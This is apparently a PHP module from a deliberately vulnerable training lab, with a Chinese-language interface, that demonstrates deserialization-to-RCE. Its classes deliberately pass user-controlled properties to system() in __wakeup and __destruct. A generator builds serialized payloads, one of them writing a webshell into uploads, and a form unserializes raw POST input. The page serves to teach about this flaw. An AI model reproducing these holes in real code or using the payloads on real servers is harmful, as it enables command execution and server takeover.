<?php
/**
 * 反序列化RCE - 演示类
 */

// 定义演示用的类 - 模拟漏洞类
class UserProfile {
    public $username;
    public $role;
    public $avatarPath;
    
    public function __construct($username = 'guest', $role = 'user') {
        $this->username = $username;
        $this->role = $role;
        $this->avatarPath = '/uploads/default.png';
    }
    
    public function __destruct() {
        // __destruct 在对象销毁时自动调用
        // 漏洞场景：在 __destruct 中执行了危险操作
        if ($this->role === 'admin' && !empty($this->avatarPath)) {
            // 模拟：根据头像路径执行操作
            if (strpos($this->avatarPath, 'system:') === 0) {
                $cmd = substr($this->avatarPath, 7);
                @system($cmd);
            }
        }
    }
    
    public function __wakeup() {
        // __wakeup 在反序列化时自动调用
        // 漏洞场景：在 __wakeup 中执行了危险操作
        if (strpos($this->username, 'exec:') === 0) {
            $cmd = substr($this->username, 5);
            @system($cmd);
        }
    }
    
    public function __toString() {
        return "User: {$this->username}, Role: {$this->role}";
    }
}

// 另一个漏洞类 - 用于演示更复杂的POP链
class FileManager {
    public $filename;
    public $content;
    public $backupPath;
    
    public function __destruct() {
        // 在析构时写入文件
        if (!empty($this->filename) && !empty($this->content)) {
            @file_put_contents($this->filename, $this->content);
        }
    }
}
?>

<div class="panel fade-in">
    <div class="level-info">
        <span class="level-dot high"></span>
        <span class="badge badge-hard">困难</span>
        <h2 style="margin:0">🧩 反序列化RCE</h2>
    </div>

    <div class="alert alert-info">
        <strong>📖 模块说明：</strong>演示PHP反序列化漏洞导致RCE。利用魔术方法
        <code>__destruct()</code>、<code>__wakeup()</code> 等触发代码执行。
    </div>

    <!-- 漏洞类信息 -->
    <div class="source-code">
        <h4>漏洞类定义（查看源码了解POP链）：</h4>
        <pre><span class="php">&lt;?php
class UserProfile {
    public $username;
    public $role;
    public $avatarPath;
    
    // __destruct: 当 role=admin 且 avatarPath 以 "system:" 开头时执行命令
    function __destruct() {
        if ($this->role === 'admin' && strpos($this->avatarPath, 'system:') === 0) {
            @system(substr($this->avatarPath, 7));
        }
    }
    
    // __wakeup: 当 username 以 "exec:" 开头时执行命令
    function __wakeup() {
        if (strpos($this->username, 'exec:') === 0) {
            @system(substr($this->username, 5));
        }
    }
}

class FileManager {
    public $filename;
    public $content;
    
    // 在析构时写入文件
    function __destruct() {
        if (!empty($this->filename) && !empty($this->content)) {
            @file_put_contents($this->filename, $this->content);
        }
    }
}
?&gt;</span></pre>
    </div>

    <!-- 生成序列化Payload -->
    <h3>🔧 生成序列化Payload</h3>
    <form method="POST">
        <input type="hidden" name="deser_action" value="generate">
        <div class="form-group">
            <label>选择漏洞类：</label>
            <select name="target_class">
                <option value="UserProfile_wakeup">UserProfile::__wakeup (通过username触发)</option>
                <option value="UserProfile_destruct">UserProfile::__destruct (通过avatarPath触发)</option>
                <option value="FileManager">FileManager::__destruct (写入文件)</option>
            </select>
        </div>
        <div class="form-group">
            <label for="deser_cmd">要执行的命令：</label>
            <input type="text" name="deser_cmd" id="deser_cmd" 
                   placeholder="whoami"
                   value="<?php echo htmlspecialchars($_POST['deser_cmd'] ?? 'whoami'); ?>">
        </div>
        <button type="submit" class="submit-btn">生成Payload 🔨</button>
    </form>

    <?php
    if (isset($_POST['deser_action']) && $_POST['deser_action'] === 'generate' && !empty($_POST['deser_cmd'])) {
        $cmd = $_POST['deser_cmd'];
        $class = $_POST['target_class'];
        $payload = '';
        $obj = null;
        
        switch ($class) {
            case 'UserProfile_wakeup':
                $obj = new UserProfile();
                $obj->username = 'exec:' . $cmd;
                $obj->role = 'user';
                $obj->avatarPath = '/uploads/default.png';
                $payload = serialize($obj);
                $trigger = '__wakeup() (username="exec:command")';
                break;
                
            case 'UserProfile_destruct':
                $obj = new UserProfile();
                $obj->username = 'attacker';
                $obj->role = 'admin';
                $obj->avatarPath = 'system:' . $cmd;
                $payload = serialize($obj);
                $trigger = '__destruct() (role=admin, avatarPath="system:command")';
                break;
                
            case 'FileManager':
                $obj = new FileManager();
                $obj->filename = 'uploads/webshell_' . time() . '.php';
                $obj->content = '<?php @system($_GET["cmd"]); ?>';
                $payload = serialize($obj);
                $trigger = '__destruct() (写入文件)';
                break;
        }
        
        echo '<div class="output-section">';
        echo '<h4>生成的 Payload：</h4>';
        echo '<div class="output-box">';
        echo '<span class="info">// 触发方式：' . htmlspecialchars($trigger) . '</span>' . "\n\n";
        echo htmlspecialchars($payload);
        echo '</div>';
        echo '<div class="status-bar">';
        echo '<span><span class="label">类名:</span> ' . htmlspecialchars($class) . '</span>';
        echo '<span><span class="label">长度:</span> ' . strlen($payload) . ' bytes</span>';
        echo '</div>';
        echo '</div>';
    }
    ?>

    <!-- 反序列化触发 -->
    <h3>🚀 反序列化触发</h3>
    <div class="alert alert-danger">
        <strong>⚠️ 将上面生成的Payload粘贴到下面输入框，点击反序列化触发RCE</strong>
    </div>
    <form method="POST">
        <input type="hidden" name="deser_action" value="trigger">
        <div class="form-group">
            <label for="serialized_data">序列化数据：</label>
            <textarea name="serialized_data" id="serialized_data" rows="3" 
                      placeholder="粘贴序列化数据..."><?php 
                echo htmlspecialchars($_POST['serialized_data'] ?? ''); 
            ?></textarea>
        </div>
        <button type="submit" class="submit-btn danger">反序列化触发 ⚡</button>
    </form>

    <?php
    if (isset($_POST['deser_action']) && $_POST['deser_action'] === 'trigger' && !empty($_POST['serialized_data'])) {
        $serialized = $_POST['serialized_data'];
        
        echo '<div class="output-section">';
        echo '<h4>反序列化结果：</h4>';
        echo '<div class="output-box">';
        
        try {
            // 捕获输出
            ob_start();
            $restored = unserialize($serialized);
            $output = ob_get_clean();
            
            echo '<span class="success">✅ 反序列化成功！</span>' . "\n";
            if ($output) {
                echo htmlspecialchars($output);
            }
            
            // 如果是FileManager，显示文件写入结果
            if ($restored instanceof FileManager && file_exists($restored->filename)) {
                echo "\n" . '<span class="success">✅ 文件已写入: ' . htmlspecialchars($restored->filename) . '</span>';
            }
            
        } catch (Throwable $e) {
            echo '<span class="error">❌ 反序列化失败: ' . htmlspecialchars($e->getMessage()) . '</span>';
        }
        
        echo '</div>';
        echo '</div>';
    }
    ?>

    <div class="tip-collapse">
        <div class="tip-header" onclick="this.nextElementSibling.classList.toggle('show')">
            📚 反序列化RCE原理
        </div>
        <div class="tip-content">
            <h4>漏洞成因：</h4>
            <ol>
                <li>程序接收了用户可控的序列化数据</li>
                <li>使用 <code>unserialize()</code> 反序列化而没有校验</li>
                <li>类中定义了魔术方法（如 <code>__destruct</code>、<code>__wakeup</code>、<code>__toString</code>）</li>
                <li>魔术方法中执行了危险操作（命令执行、文件操作等）</li>
            </ol>

            <h4>常见魔术方法：</h4>
            <div class="table-wrap">
                <table>
                    <tr><th>方法</th><th>触发时机</th></tr>
                    <tr><td><code>__wakeup()</code></td><td>反序列化时自动调用</td></tr>
                    <tr><td><code>__destruct()</code></td><td>对象销毁时自动调用</td></tr>
                    <tr><td><code>__toString()</code></td><td>对象被当作字符串时调用</td></tr>
                    <tr><td><code>__call()</code></td><td>调用不可访问的方法时调用</td></tr>
                    <tr><td><code>__get()</code></td><td>访问不可访问的属性时调用</td></tr>
                </table>
            </div>

            <h4>序列化格式说明：</h4>
            <ul class="payload-list">
                <li><code>O:4:"User":1:{s:3:"cmd";s:6:"whoami";}</code></li>
                <li><code>O</code> - 对象 (Object)</li>
                <li><code>4:"User"</code> - 类名长度和类名</li>
                <li><code>1:{...}</code> - 属性数量</li>
                <li><code>s:3:"cmd"</code> - 字符串属性名</li>
                <li><code>s:6:"whoami"</code> - 字符串属性值</li>
            </ul>
        </div>
    </div>
</div>
